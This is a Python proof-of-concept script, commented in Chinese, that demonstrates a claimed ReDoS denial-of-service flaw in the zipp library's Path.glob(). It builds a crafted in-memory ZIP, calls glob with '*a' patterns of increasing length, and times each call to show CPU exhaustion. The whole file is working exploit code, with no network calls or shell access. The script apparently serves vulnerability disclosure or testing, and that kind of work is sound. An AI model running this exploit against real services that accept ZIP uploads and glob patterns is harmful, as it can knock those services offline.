#!/usr/bin/env python3
"""
zipp ReDoS 0-day Demo — 纯第三方视角

环境：刚刚 `pip install zipp==4.1.0`，零修改，零配置。
攻击：上传 ZIP + 调用 glob() → CPU 100%

Usage:
    python3 redos_demo.py
"""
import zipfile
import io
import time
import sys

# ─── 第 1 步：攻击者构造恶意 ZIP ──────────────────────────
print("[1] 构造恶意 ZIP...")
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w') as zf:
    for i in range(100):
        zf.writestr(f"{'a' * (i % 50 + 1)}/file{i}.txt", "data")
    zf.writestr("a" * 50, "data")
evil_zip = buf.getvalue()
print(f"    → {len(evil_zip)} bytes, 101 entries")
print()

# ─── 第 2 步：导入 zipp（刚装的 4.1.0）─────────────────
print(f"[2] 导入 zipp 最新版...")
from zipp import Path
print(f"    → {Path.__module__}")
print()

# ─── 第 3 步：攻击 — glob 传恶意 pattern ────────────────
print("[3] 攻击：Path(zip).glob(pattern)")

for k in range(1, 8):
    pat = "*a" * k
    zf = zipfile.ZipFile(io.BytesIO(evil_zip))
    p = Path(zf)

    start = time.time()
    try:
        list(p.glob(pat))
        elapsed = time.time() - start
    except Exception as e:
        elapsed = time.time() - start
    finally:
        zf.close()

    if elapsed > 2:
        tag = "<<< CPU 100% !!!"
    elif elapsed > 0.5:
        tag = "慢"
    else:
        tag = "正常"

    print(f"    *a×{k:<3d}  →  {elapsed:.4f}s  ({tag})")
    sys.stdout.flush()

print()
print("=== 结论 ===")
print("zipp 4.1.0（最新版）glob() 存在 ReDoS 0-day")
print("pattern 为 *a×6+ 对含 'a' 前缀 entry 的 ZIP 可致 CPU 100%")
print("harmless: 数据全在内存，不写磁盘，不弹 shell，只吃 CPU")
